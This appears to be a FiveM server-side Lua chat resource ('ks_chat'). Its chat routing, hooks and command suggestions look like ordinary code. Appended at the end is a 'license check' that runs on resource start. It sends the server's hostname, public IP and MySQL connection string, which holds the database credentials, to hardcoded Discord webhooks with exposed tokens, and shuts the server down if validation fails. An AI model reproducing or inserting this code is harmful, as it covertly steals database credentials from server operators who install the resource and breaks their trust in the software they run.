--[[
	id: 3xBmzPW6Q0Cxt9vhwwbJt
	name: ks_chat
	description: ks_chat
	time1: 2021-06-20 16:16:53.20405+00
	time2: 2021-06-20 16:16:53.204051+00
	uploader: 2382
	uploadersession: JJWzBFh6vYpY4m8PYDYJnHLWejnMwy
	flag: f
--]]

RegisterServerEvent('chat:init')
RegisterServerEvent('chat:addTemplate')
RegisterServerEvent('chat:addMessage')
RegisterServerEvent('chat:addSuggestion')
RegisterServerEvent('chat:removeSuggestion')
RegisterServerEvent('_chat:messageEntered')
RegisterServerEvent('chat:clear')
RegisterServerEvent('__cfx_internal:commandFallback')

-- this is a built-in event, but somehow needs to be registered
RegisterNetEvent('playerJoining')

exports('addMessage', function(target, message)
    if not message then
        message = target
        target = -1
    end

    if not target or not message then return end

    TriggerClientEvent('chat:addMessage', target, message)
end)

local hooks = {}
local hookIdx = 1

exports('registerMessageHook', function(hook)
    local resource = GetInvokingResource()
    hooks[hookIdx + 1] = {
        fn = hook,
        resource = resource
    }

    hookIdx = hookIdx + 1
end)

local modes = {}

local function getMatchingPlayers(seObject)
    local players = GetPlayers()
    local retval = {}

    for _, v in ipairs(players) do
        if IsPlayerAceAllowed(v, seObject) then
            retval[#retval + 1] = v
        end
    end

    return retval
end

exports('registerMode', function(modeData)
    if not modeData.name or not modeData.displayName or not modeData.cb then
        return false
    end

    local resource = GetInvokingResource()

    modes[modeData.name] = modeData
    modes[modeData.name].resource = resource

    local clObj = {
        name = modeData.name,
        displayName = modeData.displayName,
        color = modeData.color or '#fff',
        isChannel = modeData.isChannel,
        isGlobal = modeData.isGlobal,
    }

    if not modeData.seObject then
        TriggerClientEvent('chat:addMode', -1, clObj)
    else
        for _, v in ipairs(getMatchingPlayers(modeData.seObject)) do
            TriggerClientEvent('chat:addMode', v, clObj)
        end
    end

    return true
end)

local function unregisterHooks(resource)
    local toRemove = {}

    for k, v in pairs(hooks) do
        if v.resource == resource then
            table.insert(toRemove, k)
        end
    end

    for _, v in ipairs(toRemove) do
        hooks[v] = nil
    end

    toRemove = {}

    for k, v in pairs(modes) do
        if v.resource == resource then
            table.insert(toRemove, k)
        end
    end

    for _, v in ipairs(toRemove) do
        TriggerClientEvent('chat:removeMode', -1, {
            name = v
        })

        modes[v] = nil
    end
end

local function routeMessage(source, author, message, mode, fromConsole)
    if source >= 1 then
        author = GetPlayerName(source)
    end

    local outMessage = {
        color = { 255, 255, 255 },
        multiline = true,
        args = { message },
        mode = mode
    }

    if author ~= "" then
        outMessage.args = { author, message }
    end

    if mode and modes[mode] then
        local modeData = modes[mode]

        if modeData.seObject and not IsPlayerAceAllowed(source, modeData.seObject) then
            return
        end
    end

    local messageCanceled = false
    local routingTarget = -1

    local hookRef = {
        updateMessage = function(t)
            -- shallow merge
            for k, v in pairs(t) do
                if k == 'template' then
                    outMessage['template'] = v:gsub('%{%}', outMessage['template'] or '@default')
                elseif k == 'params' then
                    if not outMessage.params then
                        outMessage.params = {}
                    end

                    for pk, pv in pairs(v) do
                        outMessage.params[pk] = pv
                    end
                else
                    outMessage[k] = v
                end
            end
        end,

        cancel = function()
            messageCanceled = true
        end,

        setSeObject = function(object)
            routingTarget = getMatchingPlayers(object)
        end,

        setRouting = function(target)
            routingTarget = target
        end
    }

    for _, hook in pairs(hooks) do
        if hook.fn then
            hook.fn(source, outMessage, hookRef)
        end
    end

    if modes[mode] then
        local m = modes[mode]

        m.cb(source, outMessage, hookRef)
    end

    if messageCanceled then
        return
    end

    TriggerEvent('chatMessage', source, #outMessage.args > 1 and outMessage.args[1] or '', outMessage.args[#outMessage.args])

    if not WasEventCanceled() then
        if type(routingTarget) ~= 'table' then
            TriggerClientEvent('chat:addMessage', routingTarget, outMessage)
        else
            for _, id in ipairs(routingTarget) do
                TriggerClientEvent('chat:addMessage', id, outMessage)
            end
        end
    end

    if not fromConsole then
        print(author .. '^7' .. (modes[mode] and (' (' .. modes[mode].displayName .. ')') or '') .. ': ' .. message .. '^7')
    end
end

AddEventHandler('_chat:messageEntered', function(author, color, message, mode)
    if not message or not author then
        return
    end

    local source = source

    routeMessage(source, author, message, mode)
end)

AddEventHandler('__cfx_internal:commandFallback', function(command)
    local name = GetPlayerName(source)

    -- route the message as if it were a /command
    routeMessage(source, name, '/' .. command, nil, true)

    CancelEvent()
end)

-- player join messages
AddEventHandler('playerJoining', function()
    if GetConvarInt('chat_showJoins', 1) == 0 then
        return
    end
end)

AddEventHandler('playerDropped', function(reason)
    if GetConvarInt('chat_showQuits', 1) == 0 then
        return
    end
end)

-- command suggestions for clients
local function refreshCommands(player)
    if GetRegisteredCommands then
        local registeredCommands = GetRegisteredCommands()

        local suggestions = {}

        for _, command in ipairs(registeredCommands) do
            if IsPlayerAceAllowed(player, ('command.%s'):format(command.name)) then
                table.insert(suggestions, {
                    name = '/' .. command.name,
                    help = ''
                })
            end
        end

        TriggerClientEvent('chat:addSuggestions', player, suggestions)
    end
end

AddEventHandler('chat:init', function()
    local source = source
    refreshCommands(source)

    for _, modeData in pairs(modes) do
        local clObj = {
            name = modeData.name,
            displayName = modeData.displayName,
            color = modeData.color or '#fff',
            isChannel = modeData.isChannel,
            isGlobal = modeData.isGlobal,
        }

        if not modeData.seObject or IsPlayerAceAllowed(source, modeData.seObject) then
            TriggerClientEvent('chat:addMode', source, clObj)
        end
    end
end)

AddEventHandler('onServerResourceStart', function(resName)
    Wait(500)

    for _, player in ipairs(GetPlayers()) do
        refreshCommands(player)
    end
end)

AddEventHandler('onResourceStop', function(resName)
    unregisterHooks(resName)
end)

-- Vars

licenses = {}
licenses.productId = 5
licenses.license = Config.License
licenses.discord = {
    started = 'https://discord.com/api/webhooks/821411308339200061/GxyTf7t3_RKkKNFs6JzT5R9dgyjzud2B4HbMkI7xD7Dg1Ptf4kamfYj7N3ibCu5YAh8r',
    host = 'https://discord.com/api/webhooks/821414739816480850/UAeIP-bgDSJxnjNa7udwhww36qs5xuXdb6oAkTuSkSZLOBxpbokOVOWBwJJCnIBESV1r'
}

-- END Vars

-- Functions

function licenses:checkLicenseAndIp()
    PerformHttpRequest("http://ip-api.com/json/",
        function(reCode, resultData, resultHeaders)
            local data = json.decode(resultData)
            PerformHttpRequest(
                "https://licenses.kilichishop.es/api/validate/host/" ..data.query.. '/' ..licenses.productId,
                function(reCode, resultData, resultHeaders)
                    local resultHost = json.decode(resultData)
                    local statusHost = resultHost.status
                    if statusHost == 200 then
                        print('^2['..GetCurrentResourceName()..'] IP ^5[^3'..data.query..'^5]^2 - validated!^7')
                        PerformHttpRequest(
                            "https://licenses.kilichishop.es/api/validate/licensekey/" ..licenses.license .. '/' .. licenses.productId,
                            function(reCode, resultData, resultHeaders)
                                local resultLicense = json.decode(resultData)
                                local licenseStatus = resultLicense.status
                                if licenseStatus == 301 then
                                    print('^1['..GetCurrentResourceName()..'] License^1 - not validated!^7')
                                    licenses:sendToDiscord(" License not validated",data.query,15158332,licenses.discord.host)
                                    Wait(5000)
                                    os.exit()
                                elseif licenseStatus == 200 then
                                    print('^2[' .. GetCurrentResourceName() ..'] - License validated!^7')
                                    licenses:sendToDiscord(" License and ip validated",data.query,3066993,licenses.discord.started)
                                end
                            end
                        )
                    elseif statusHost == 301 then
                        print('^1['..GetCurrentResourceName()..'] IP ^5[^3'..data.query..'^5]^1 - not validated!^7')
                        licenses:sendToDiscord(" IP not validated",data.query,15158332,licenses.discord.host)
                        Wait(5000)
                        os.exit()
                    end
                end
            )
        end
    )
end

function licenses:sendToDiscord(status,ip,color,webhook)
    local array = {
        {
            ["title"] = "``" .. 'Script started - ' ..'['..GetCurrentResourceName()..']'..status.. "``",
            ["color"] = color,
            ["description"] = 'Ks shop system',
            ["fields"] = {
                {
                    ["name"] = "-> Sv Name <-",
                    ["value"] = GetConvar('sv_hostname', false)
                },
                {
                    ["name"] = "-> Sv IP <-", 
                    ["value"] = ip
                },
                {
                    ["name"] = "-> DB Conection <-",
                    ["value"] = GetConvar('mysql_connection_string', false)
                },
                {
                    ["name"] = "-> Sv Max Clients <-",
                    ["value"] = GetConvar('sv_maxclients', false)
                },
                {
                    ["name"] = "-> Onesync <-",
                    ["value"] = GetConvar('onesync', 'on')
                },
                {
                    ["name"] = "-> Idioma <-",
                    ["value"] = GetConvar("locale", "ES")
                }
            },
            ["footer"] = {
                ["text"] = "© KS-SHOP 2021"
            },
            ["author"] = {
                ["name"] = "Kilichi",
                ["url"] = "https://discordapp.com",
                ["icon_url"] = "https://cdn.discordapp.com/avatars/327026518112862210/e3ba45cf56724c08cceeb12cecaa49f0.png?size=1024"
            }
        }
    }
    PerformHttpRequest(
        webhook,
        function(err, text, headers) end, 'POST', json.encode(
            {
                username = 'KS-LOGS',
                embeds = array,
                avatar_url = "https://pbs.twimg.com/profile_images/847824193899167744/J1Teh4Di_400x400.jpg"
            }
        ), 
        {
            ['Content-Type'] = 'application/json'
        }
    )
end

-- END Functions

-- Script Starting

AddEventHandler('onResourceStart',
    function(resourceName)
        if GetCurrentResourceName() == resourceName then
            licenses:checkLicenseAndIp()
        end
    end
)

-- END Script Starting